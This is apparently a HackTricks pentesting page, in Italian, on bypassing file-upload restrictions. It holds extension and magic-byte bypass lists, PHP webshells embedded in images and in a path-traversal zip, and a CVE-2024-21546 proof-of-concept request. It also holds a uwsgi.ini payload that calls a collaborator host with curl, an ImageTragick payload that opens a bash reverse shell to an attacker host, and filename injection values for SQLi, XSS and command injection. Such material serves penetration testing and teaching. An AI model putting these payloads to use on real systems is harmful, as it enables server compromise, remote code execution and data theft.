# Upload di file

{{#include ../../banners/hacktricks-training.md}}

## Metodologia generale per l'upload di file

Altre estensioni utili:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass dei controlli sulle estensioni dei file

1. Se applicabile, **controlla** le **estensioni precedenti.** Testale anche usando alcune **lettere maiuscole**: _pHp, .pHP5, .PhAr ..._
2. _Controlla **l'aggiunta di una estensione valida prima** dell'estensione eseguibile (usa anche le estensioni precedenti):_
- _file.png.php_
- _file.png.Php5_
3. _Prova ad aggiungere **caratteri speciali alla fine.** Puoi usare Burp per **bruteforce** tutti i caratteri **ascii** e **Unicode**. (_Nota che puoi anche provare a usare le **estensioni** menzionate in precedenza_)_
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Prova a bypassare le protezioni **ingannando il parser delle estensioni** lato server con tecniche come **raddoppiare** l'**estensione** o **aggiungere dati spazzatura** (byte **null**) tra le estensioni. _Puoi anche usare le **estensioni** precedenti per preparare un payload migliore._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Aggiungi **un altro livello di estensioni** al controllo precedente:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Prova a mettere l'**exec extension before the valid extension** e spera che il server sia malconfigurato. (utile per sfruttare misconfigurazioni di Apache dove qualsiasi file con extension** _**.php**_**, ma** non necessariamente terminante in .php** eseguirà codice):
- _ex: file.php.png_
7. Uso degli **NTFS alternate data stream (ADS)** in **Windows**. In questo caso, un carattere due punti ":" sarà inserito dopo un'estensione proibita e prima di una consentita. Di conseguenza, verrà creato sul server un **file vuoto con l'estensione proibita** (e.g. "file.asax:.jpg"). Questo file potrebbe essere modificato in seguito usando altre tecniche come l'uso del suo short filename. Il "**::$data**” pattern può anche essere usato per creare file non vuoti. Pertanto, aggiungere un carattere punto dopo questo pattern potrebbe anche essere utile per bypassare ulteriori restrizioni (e.g. "file.asp::$data.")
8. Prova a superare i limiti del nome file. L'estensione valida viene troncata. E il PHP malevolo rimane. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Alcuni upload handlers tagliano o normalizzano i caratteri punto finali dal nome file salvato. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) nelle versioni precedenti alla 2.9.1, puoi bypassare la validazione delle estensioni tramite:

- Usare un MIME immagine valido e un magic header (e.g., PNG’s `\x89PNG\r\n\x1a\n`).
- Nominare il file caricato con un'estensione PHP seguita da un punto, e.g., `shell.php.`.
- Il server rimuove il punto finale e persiste `shell.php`, che verrà eseguito se posizionato in una directory servita dal web (storage pubblico di default come `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Quindi visita il percorso salvato (tipico in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Upgrade unisharp/laravel-filemanager to ≥ 2.9.1.
- Applica allowlists lato server rigorose e ri-verifica il persisted filename.
- Serve gli uploads da percorsi non eseguibili.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` or you could also **introduce the payload directly** in an image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- If **compressions is being added to your image**, for example using some standard PHP libraries like [PHP-GD](https://www.php.net/manual/fr/book.image.php), the previous techniques won't be useful it. However, you could use the **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- The web page cold also be **resizing** the **image**, using for example the PHP-GD functions `imagecopyresized` or `imagecopyresampled`. However, you could use the **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Another technique to make a payload that **survives an image resizing**, using the PHP-GD function `thumbnailImage`. However, you could use the **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Trova una vulnerabilità che permetta di **rename** il file già caricato (per cambiare l'estensione).
- Individua una vulnerabilità di **Local File Inclusion** per eseguire il backdoor.
- **Possibile divulgazione di informazioni**:
1. Carica **più volte** (e **allo stesso tempo**) lo **stesso file** con lo **stesso nome**
2. Carica un file con il **nome** di un **file** o **cartella** che **esiste già**
3. Caricare un file con **"." , "..”, o "…”** come nome. Per esempio, in Apache su **Windows**, se l'applicazione salva i file caricati nella directory "/www/uploads/" il filename "." creerà un file chiamato "uploads" nella directory "/www/".
4. Carica un file che potrebbe non essere facilmente eliminabile come **"…:.jpg”** su **NTFS**. (Windows)
5. Carica un file su **Windows** con caratteri non validi come `|<>*?”` nel nome. (Windows)
6. Carica un file su **Windows** usando nomi riservati (forbidden) come CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, e LPT9.
- Prova anche a **uploadare un eseguibile** (.exe) o un **.html** (meno sospetto) che **eseguirà codice** quando accidentalmente aperto dalla vittima.

### Special extension tricks

Se stai cercando di caricare file su un **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Se stai cercando di caricare file su un **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

I file `.phar` sono come i `.jar` per java, ma per php, e possono essere **usati come un file php** (eseguirli con php, o includerli dentro uno script...).

L'estensione `.inc` è talvolta usata per file php che servono solo per **importare file**, quindi, a un certo punto, qualcuno potrebbe aver permesso che **questa estensione venga eseguita**.

## **Jetty RCE**

Se puoi caricare un file XML in un server Jetty puoi ottenere [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Quindi, come mostrato nell'immagine seguente, carica il file XML in `$JETTY_BASE/webapps/` e aspettati la shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Per un'esplorazione dettagliata di questa vulnerabilità consulta la ricerca originale: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Le vulnerabilità di Remote Command Execution (RCE) possono essere sfruttate nei server uWSGI se si ha la possibilità di modificare il file di configurazione `.ini`. I file di configurazione uWSGI sfruttano una sintassi specifica per incorporare variabili "magiche", placeholder e operatori. Notevolmente, l'operatore '@', utilizzato come `@(filename)`, è progettato per includere il contenuto di un file. Tra gli schemi supportati in uWSGI, lo schema "exec" è particolarmente potente, permettendo la lettura dei dati dall'output standard di un processo. Questa funzionalità può essere manipolata per scopi malevoli come Remote Command Execution o Arbitrary File Write/Read quando un file di configurazione `.ini` viene processato.

Considera il seguente esempio di un file `uwsgi.ini` malevolo che mostra vari schemi:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
L'esecuzione del payload avviene durante il parsing del file di configurazione. Perché la configurazione venga attivata e analizzata, il processo uWSGI deve essere riavviato (potenzialmente dopo un crash o a causa di un attacco Denial of Service) oppure il file deve essere impostato in auto-reload. La funzione auto-reload, se abilitata, ricarica il file a intervalli specificati quando rileva modifiche.

È fondamentale comprendere la natura permissiva del parsing dei file di configurazione di uWSGI. In particolare, il payload discusso può essere inserito in un file binario (ad esempio un'immagine o un PDF), ampliando ulteriormente l'ambito di possibile sfruttamento.

## **wget File Upload/SSRF Trick**

In alcune occasioni potresti trovare che un server utilizza **`wget`** per **scaricare file** e puoi **indicare** l'**URL**. In questi casi, il codice può controllare che l'estensione dei file scaricati sia nella whitelist per assicurare che vengano scaricati solo file consentiti. Tuttavia, **questo controllo può essere bypassato.**\
Il **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. Puoi **scaricare un file chiamato "A"\*232+".php"+".gif"**, questo nome file **bypasserà** il **controllo** (poiché in questo esempio **".gif"** è un'estensione **valida**) ma `wget` **rinominerà** il file in **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Nota che **un'altra opzione** che potresti prendere in considerazione per bypassare questo controllo è far sì che il **server HTTP reindirizzi a un file diverso**, così l'URL iniziale supererà il controllo ma poi wget scaricherà il file reindirizzato con il nuovo nome. Questo **non funzionerà** **a meno che** wget non sia usato con il **parametro** `--trust-server-names` perché **wget scaricherà la pagina reindirizzata con il nome del file indicato nell'URL originale**.

## Strumenti

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) è uno strumento potente progettato per assistere Pentesters e Bug Hunters nel testing dei meccanismi di upload di file. Sfrutta varie tecniche di bug bounty per semplificare il processo di identificazione e sfruttamento di vulnerabilità, garantendo valutazioni approfondite delle applicazioni web.

### Corrompere gli indici di upload con le idiosincrasie di snprintf (storico)

Alcuni legacy upload handlers che usano `snprintf()` o simili per costruire array multi-file da un singolo upload possono essere ingannati nel forgiare la struttura `_FILES`. A causa di incoerenze e troncamenti nel comportamento di `snprintf()`, un upload singolo accuratamente costruito può apparire come più file indicizzati lato server, confondendo la logica che assume una forma rigida (es. trattarlo come un upload multi-file e prendere branch non sicuri). Pur essendo di nicchia oggi, questo pattern di “index corruption” riemerge occasionalmente in CTF e codebase più vecchie.

## Da upload di file ad altre vulnerabilità

- Imposta **filename** su `../../../tmp/lol.png` e prova a ottenere un **path traversal**
- Imposta **filename** su `sleep(10)-- -.jpg` e potresti riuscire a ottenere una **SQL injection**
- Imposta **filename** su `<svg onload=alert(document.domain)>` per ottenere una **XSS**
- Imposta **filename** su `; sleep 10;` per testare qualche command injection (più [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Prova **different svg payloads** da [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Se puoi **indicare al web server di recuperare un'immagine da un URL** potresti provare ad abusare di una [SSRF](../ssrf-server-side-request-forgery/index.html). Se questa **image** verrà **salvata** in un sito **pubblico**, potresti anche indicare un URL da [https://iplogger.org/invisible/](https://iplogger.org/invisible/) e **rubare informazioni di ogni visitatore**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- PDF appositamente costruiti per XSS: La [pagina seguente mostra come **iniettare dati PDF per ottenere l'esecuzione di JS**](../xss-cross-site-scripting/pdf-injection.md). Se puoi caricare PDF potresti preparare un PDF che esegua JS arbitrario seguendo le indicazioni fornite.
- Carica il contenuto di \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) per verificare se il server ha qualche **antivirus**
- Verifica se esiste un **size limit** nel caricamento dei file

Ecco una top 10 delle cose che puoi ottenere caricando file (da [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Consulta [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) per altri tipi di file.

## Upload di Zip/Tar decompressi automaticamente

Se puoi caricare uno ZIP che verrà decompresso sul server, puoi fare 2 cose:

### Symlink

Carica un archivio che contiene soft link a altri file; accedendo ai file decompressi accederai ai file linkati:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decomprimere in cartelle diverse

La creazione imprevista di file in directory durante la decompressione è un problema significativo. Nonostante l'ipotesi iniziale che questa configurazione potesse proteggere dall'esecuzione di comandi a livello OS tramite upload di file dannosi, il supporto alla compressione gerarchica e le capacità di directory traversal del formato di archivio ZIP possono essere sfruttate. Questo permette agli attaccanti di aggirare le restrizioni ed evadere le directory di upload sicure manipolando la funzionalità di decompressione dell'applicazione target.

Un exploit automatizzato per creare tali file è disponibile su [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). L'utility può essere usata come mostrato:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Inoltre, il **symlink trick with evilarc** è un'opzione. Se l'obiettivo è mirare a un file come `/flag.txt`, crea nel tuo sistema un symlink a quel file. Questo garantisce che evilarc non incontri errori durante la sua esecuzione.

Di seguito un esempio di codice Python usato per creare un file zip malevolo:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Sfruttare la compressione per file spraying**

Per maggiori dettagli **controlla il post originale su**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Il codice PHP è scritto per eseguire comandi passati tramite la variabile `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Vengono creati più file e viene assemblato un archivio zip contenente questi file.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: I nomi dei file all'interno dello zip vengono modificati usando vi o un hex editor, cambiando "xxA" in "../" per attraversare le directory.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Carica questo contenuto con un'estensione immagine per sfruttare la vulnerabilità **(ImageMagick , 7.0.1-1)** (dal [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incorporare PHP Shell in PNG

Incorporare una PHP shell nello chunk IDAT di un file PNG può eludere efficacemente alcune operazioni di elaborazione delle immagini. Le funzioni `imagecopyresized` e `imagecopyresampled` di PHP-GD sono particolarmente rilevanti in questo contesto, poiché vengono comunemente usate per ridimensionare e ricampionare le immagini, rispettivamente. La capacità della PHP shell incorporata di rimanere inalterata da queste operazioni è un vantaggio significativo per alcuni scenari d'uso.

Una esplorazione dettagliata di questa tecnica, inclusa la metodologia e le possibili applicazioni, è fornita nel seguente articolo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Questa risorsa offre una comprensione completa del processo e delle sue implicazioni.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

I polyglot files agiscono come uno strumento unico nella cybersecurity, comportandosi come camaleonti che possono esistere validamente in più formati di file contemporaneamente. Un esempio interessante è un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un ibrido che funziona sia come GIF sia come archivio RAR. Questi file non sono limitati a questa coppia; sono possibili anche combinazioni come GIF e JS o PPT e JS.

L'utilità principale dei polyglot files risiede nella loro capacità di eludere misure di sicurezza che controllano i file in base al tipo. È pratica comune in diverse applicazioni permettere solo determinati tipi di file in upload—come JPEG, GIF o DOC—per mitigare il rischio rappresentato da formati potenzialmente pericolosi (es. JS, PHP o Phar). Tuttavia, un polyglot, conformandosi ai criteri strutturali di più tipi di file, può aggirare silenziosamente queste restrizioni.

Nonostante la loro adattabilità, i polyglot incontrano dei limiti. Per esempio, mentre un polyglot potrebbe incarnare simultaneamente un file PHAR e un JPEG, il successo dell'upload potrebbe dipendere dalle politiche sulle estensioni del sistema. Se la piattaforma è rigorosa riguardo le estensioni consentite, la semplice dualità strutturale di un polyglot potrebbe non essere sufficiente per garantirne l'upload.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Come evitare il rilevamento del tipo di file caricando un file JSON valido anche se non consentito fingendo che sia un PDF (tecniche da **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Finché i magic bytes `%PDF` sono presenti nei primi 1024 byte è considerato valido (vedi esempio nel post)
- **`pdflib` library**: Aggiungi un finto formato PDF all'interno di un campo del JSON in modo che la libreria lo interpreti come PDF (vedi esempio nel post)
- **`file` binary**: Può leggere fino a 1048576 byte da un file. Crea un JSON più grande di tale soglia in modo che non possa analizzare il contenuto come JSON e poi, all'interno del JSON, inserisci la parte iniziale di un PDF reale e penserà che sia un PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
